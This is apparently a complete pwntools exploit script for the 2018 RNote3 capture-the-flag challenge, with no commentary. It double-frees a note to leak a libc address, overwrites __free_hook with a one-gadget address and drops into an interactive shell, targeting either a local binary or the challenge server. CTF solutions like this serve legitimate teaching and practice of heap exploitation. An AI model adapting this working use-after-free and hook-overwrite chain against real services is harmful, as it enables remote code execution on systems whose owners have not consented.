from pwn import *

oneshot=0x4526A
freehook=0x3c67a8

DEBUG = 1

if DEBUG == 1:
  p=process('./RNote3')
  context(log_level='debug')
  gdb.attach(p)
else:
  p=remote('rnote3.2018.teamrois.cn',7322)

def add_note(title, content_size, content):
    p.sendline('1')
    p.recvuntil('please input title: ')
    p.send(title)
    p.recvuntil('please input content size: ')
    p.sendline(str(content_size))
    p.recvuntil('please input content: ')
    p.send(content)

def view_note(title):
    p.sendline('2')
    p.recvuntil('please input note title: ')
    p.send(title)

def edit_note(title, content):
    p.sendline('3')
    print p.recvuntil('please input note title: ')
    p.send(title)
    print p.recvuntil('please input new content: ')
    p.send(content)

def delete_note(title):
    p.sendline('4')
    p.recvuntil('please input note title: ')
    p.send(title)

p.recvuntil('5. Exit\n')

add_note('a' * 8, 24, 'a' * 24)

delete_note('a' * 8)
delete_note('a' * 8)

add_note('\x00' * 8, 24, 'b' * 24)
add_note('c' * 8, 256, 'c' * 256)
add_note('d' * 8, 24, 'd' * 24)

delete_note('c' * 8)

view_note('\x00' * 8)

p.recvuntil('note content: ')
libc_base = u64(p.recv(6) + '\x00\x00') - 0x3c4b78
print 'libc base: {}'.format(hex(libc_base))

delete_note('d' * 8)
add_note('e' * 8, 256, 'e' * 256)
add_note('f' * 8, 24, '\x00' * 8 + p64(24) + p64(libc_base + freehook))

edit_note('\x00' * 7 + '\n', p64(libc_base + oneshot) + '\n')

delete_note('\x00' * 8)
p.interactive()
